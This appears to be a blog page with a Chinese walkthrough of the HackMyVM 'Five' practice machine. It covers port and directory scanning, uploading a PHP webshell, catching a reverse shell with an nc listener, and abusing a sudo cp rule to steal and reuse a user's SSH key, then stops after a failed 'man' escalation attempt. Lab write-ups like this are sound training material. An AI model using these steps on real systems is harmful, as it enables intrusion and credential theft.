@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-Five靶机复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Five">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/48411.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-Five靶机复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b3f3a0d0e0a243d4005f94.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b3f5b1d0e0a243d4006035.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b3f719d0e0a243d4006095.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b3f753d0e0a243d40060ab.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b3fa31d0e0a243d4006199.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b3fb23d0e0a243d40061d8.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67b4047ed0e0a243d400658a.png">
+<meta property="article:published_time" content="2025-02-18T02:41:32.000Z">
+<meta property="article:modified_time" content="2025-02-18T04:07:14.627Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67b3f3a0d0e0a243d4005f94.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/48411.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-Five | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/48411.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-Five
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-18 10:41:32 / 修改时间：12:07:14" itemprop="dateCreated datePublished" datetime="2025-02-18T10:41:32+08:00">2025-02-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67b3f382d0e0a243d4005f72.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-Five靶机复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/67b3f3a0d0e0a243d4005f94.png"></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.112.17  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">18</span> <span class="number">10</span>:<span class="number">47</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.17</span>)</span><br><span class="line">Host is up (<span class="number">0.0024</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">1</span> disallowed entry </span><br><span class="line">|_<span class="symbol">/admin</span></span><br><span class="line">|<span class="params">_http-title:</span> <span class="number">403</span> Forbidden</span><br><span class="line">MAC <span class="params">Address:</span> B6:<span class="number">07</span>:F9:<span class="number">39</span>:F0:<span class="number">32</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.39</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.17</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">7.94</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>只有80端口，而且nmap扫出来了&#x2F;admin路径那就直接进入web部分</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>直接curl一下发现403了，猜测可能要改host，去浏览器里面访问看看<br><img src="https://pic1.imgdb.cn/item/67b3f5b1d0e0a243d4006035.png"><br>还真的就是403，域名这边也没有变化，那就去&#x2F;admin里面看<br>发现是一个登录界面，登录错误有回显，那就先用bp爆破一下<br>用户名用admin爆破了一下密码，没有爆破出来<br>用gobuster扫一下目录吧</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -u http://192.168.112.17/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,jpg,webg,png,js,txt</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.112.17/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,html,jpg,webg,png,js,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/uploads              (Status: 301) [Size: 185] [--&gt; http://192.168.112.17/uploads/]</span><br><span class="line">/admin                (Status: 301) [Size: 185] [--&gt; http://192.168.112.17/admin/]</span><br><span class="line">/upload.html          (Status: 200) [Size: 346]</span><br><span class="line">/upload.php           (Status: 200) [Size: 48]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 17]</span><br><span class="line">Progress: 743223 / 1661152 (44.74%)^C</span><br><span class="line">[!] Keyboard interrupt detected, terminating.</span><br><span class="line"><span class="section">Progress: 744172 / 1661152 (44.80%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="code">                                                                     </span></span><br></pre></td></tr></table></figure></div>
+<p>这里有一个upload.html界面可以上传文件<br><img src="https://pic1.imgdb.cn/item/67b3f719d0e0a243d4006095.png"><br>上传一个一句话木马1.php，成功上传，而且跳转到upload.php这里<br><img src="https://pic1.imgdb.cn/item/67b3f753d0e0a243d40060ab.png"><br>现在的目标就是找到上传的位置，然后用蚁剑连接了。<br>抓包用bp查看，可以看到是上传到uploads&#x2F;目录下面，但是这个目录下我无法访问<br><img src="https://pic1.imgdb.cn/item/67b3fa31d0e0a243d4006199.png"><br>那就把这个路径删除，让它上传到根目录<br>现在用蚁剑就可以成功连接了，那现在就进入蚁剑的虚拟终端里面反弹shell<br>因为蚁剑的这个虚拟终端不是一个真正的终端，所以不能直接用<br><img src="https://pic1.imgdb.cn/item/67b3fb23d0e0a243d40061d8.png"><br>成功拿到shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234           </span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">www-data@five:~/html$ ^Z</span><br><span class="line">zsh: suspended  nc -lp 1234</span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">cat</span> bbb            </span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">[1]  + continued  nc -lp 1234</span><br><span class="line">                             reset</span><br><span class="line">reset: unknown terminal <span class="built_in">type</span> unknown</span><br><span class="line">Terminal <span class="built_in">type</span>? xterm</span><br></pre></td></tr></table></figure></div>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="www"><a href="#www" class="headerlink" title="www"></a>www</h2><p>先去看一下www用户的sudo权限，发现有一个用户的cp命令</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/var</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">five:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">five:</span></span><br><span class="line">    (melisa) <span class="symbol">NOPASSWD:</span> /bin/cp</span><br></pre></td></tr></table></figure></div>
+<p>去用户的目录下面看，发现有.ssh，那我的原来目标就是去拿ssh私钥,但是这个靶机没有开放22端口<br>但是我去看开放了什么端口，发现有一个4444端口</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">www</span>-data@five:/home/melisa$ ss -tulnp</span><br><span class="line"><span class="attribute">Netid</span>       State        Recv-Q       Send-Q             Local Address:Port               Peer Address:Port                                             </span><br><span class="line"><span class="attribute">udp</span>         UNCONN       <span class="number">0</span>            <span class="number">0</span>                        <span class="number">0.0.0.0:68</span>                      <span class="number">0.0.0.0</span>:*                                                </span><br><span class="line"><span class="attribute">tcp</span>         LISTEN       <span class="number">0</span>            <span class="number">128</span>                      <span class="number">0.0.0.0:80</span>                      <span class="number">0.0.0.0</span>:*           users:((<span class="string">&quot;nginx&quot;</span>,pid=<span class="number">384</span>,fd=<span class="number">6</span>))       </span><br><span class="line"><span class="attribute">tcp</span>         LISTEN       <span class="number">0</span>            <span class="number">128</span>                    <span class="number">127.0.0.1:4444</span>                    <span class="number">0.0.0.0</span>:*                                                </span><br><span class="line"><span class="attribute">tcp</span>         LISTEN       <span class="number">0</span>            <span class="number">128</span>                        <span class="meta"> [::]:80                         [::]:*           users:((&quot;nginx&quot;,pid=384,fd=7))  </span></span><br></pre></td></tr></table></figure></div>
+<p>说不定可行<br>复制私钥过来，发现4444端口是可以登录的，但是permission deny了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/home/melisa</span><span class="variable">$ </span>sudo -u melisa cp /home/melisa/.ssh/id_rsa /tmp</span><br><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/home/melisa</span><span class="variable">$ </span>cd /tmp</span><br><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/tmp</span><span class="variable">$ </span>chmod <span class="number">600</span> id_rsa</span><br><span class="line"><span class="symbol">chmod:</span> changing permissions of <span class="string">&#x27;id_rsa&#x27;</span>: <span class="title class_">Operation</span> <span class="keyword">not</span> permitted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/tmp</span><span class="variable">$ </span>ssh melisa<span class="variable">@127</span>.<span class="number">0.0</span>.<span class="number">1</span> -p <span class="number">4444</span> -i id_rsa</span><br><span class="line"><span class="title class_">Could</span> <span class="keyword">not</span> create directory <span class="string">&#x27;/var/www/.ssh&#x27;</span>.</span><br><span class="line"><span class="title class_">The</span> authenticity of host <span class="string">&#x27;[127.0.0.1]:4444 ([127.0.0.1]:4444)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:jWQpYhXQJtOuJfrNjZvNSilLDT7fkbFxeioQzGTBY7Y.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">Load key &quot;id_rsa&quot;: Permission denied</span></span><br></pre></td></tr></table></figure></div>
+<p>看了wp知道原来是没有公钥,用<code>ssh-keygen</code>可以生成公钥</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/tmp</span><span class="variable">$ </span>ssh-keygen -y -f id_rsa &gt; authorized_keys</span><br><span class="line"><span class="title class_">Load</span> key <span class="string">&quot;id_rsa&quot;</span>: <span class="title class_">Permission</span> denied</span><br></pre></td></tr></table></figure></div>
+<p>这里因为id_rsa是melisa的，www用户权限不足<br>解决方法是我们自己创建一个文件，这个文件就有权限了，然后用sudo把内容也复制过来</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@five:/tmp$ <span class="built_in">sudo</span> -u melisa /bin/cp /tmp/id_rsa /tmp/id</span><br><span class="line">/bin/cp: cannot create regular file <span class="string">&#x27;/tmp/id&#x27;</span>: Permission denied</span><br><span class="line"></span><br><span class="line">www-data@five:/tmp$ <span class="built_in">chmod</span> 777 <span class="built_in">id</span></span><br><span class="line">www-data@five:/tmp$ <span class="built_in">sudo</span> -u melisa /bin/cp /tmp/id_rsa /tmp/id</span><br><span class="line"></span><br><span class="line">www-data@five:/tmp$ ssh-keygen -y -f <span class="built_in">id</span> &gt; authorized_keys</span><br><span class="line">www-data@five:/tmp$ <span class="built_in">sudo</span> -u melisa /bin/cp /tmp/authorized_keys /home/melisa/.ssh</span><br></pre></td></tr></table></figure></div>
+
+<p>成功生成私钥，并且放到用户的.ssh目录下面了</p>
+<p>成功登录了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">www</span>-data@five:/tmp$ ssh melisa@<span class="number">127.0.0.1</span> -p <span class="number">4444</span> -i id</span><br><span class="line"><span class="attribute">Could</span> not create directory &#x27;/var/www/.ssh&#x27;.</span><br><span class="line"><span class="attribute">The</span> authenticity of host &#x27;[<span class="number">127.0.0.1</span>]:<span class="number">4444</span> ([<span class="number">127.0.0.1</span>]:<span class="number">4444</span>)&#x27; can&#x27;t be established.</span><br><span class="line"><span class="attribute">ECDSA</span> key fingerprint is SHA256:jWQpYhXQJtOuJfrNjZvNSilLDT7fkbFxeioQzGTBY7Y.</span><br><span class="line"><span class="attribute">Are</span> you sure you want to continue connecting (yes/no)? yes</span><br><span class="line"><span class="attribute">Failed</span> to add the host to the list of known hosts (/var/www/.ssh/known_hosts).</span><br><span class="line"><span class="attribute">Linux</span> five <span class="number">4</span>.<span class="number">19</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4</span>.<span class="number">19</span>.<span class="number">118</span>-<span class="number">2</span>+deb10u1 (<span class="number">2020</span>-<span class="number">06</span>-<span class="number">07</span>) x86_64</span><br><span class="line"></span><br><span class="line"><span class="attribute">The</span> programs included with the Debian GNU/Linux system are free software;</span><br><span class="line"><span class="attribute">the</span> exact distribution terms for each program are described in the</span><br><span class="line"><span class="attribute">individual</span> files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line"><span class="attribute">Debian</span> GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line"><span class="attribute">permitted</span> by applicable law.</span><br><span class="line"><span class="attribute">Last</span> login: Tue Oct  <span class="number">6</span> <span class="number">03</span>:<span class="number">39</span>:<span class="number">32</span> <span class="number">2020</span> from <span class="number">192.168.1.58</span></span><br><span class="line"><span class="attribute">melisa</span>@five:~$ </span><br></pre></td></tr></table></figure></div>
+<h2 id="melisa"><a href="#melisa" class="headerlink" title="melisa"></a>melisa</h2><p>有sudo</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">melisa<span class="variable">@five</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> melisa on <span class="symbol">five:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=<span class="regexp">/usr/local</span><span class="regexp">/sbin\:/usr</span><span class="regexp">/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> melisa may run the following commands on <span class="symbol">five:</span></span><br><span class="line">    (<span class="variable constant_">ALL</span>) <span class="variable constant_">SETENV</span>: <span class="variable constant_">NOPASSWD</span>: <span class="regexp">/bin/pwd</span>, <span class="regexp">/bin/arch</span>, <span class="regexp">/bin/man</span>, <span class="regexp">/bin/id</span>, <span class="regexp">/bin/rm</span>, <span class="regexp">/bin/clear</span></span><br></pre></td></tr></table></figure></div>
+<p>找到man提权的方式<br><img src="https://pic1.imgdb.cn/item/67b4047ed0e0a243d400658a.png"><br>但是报错了</p>
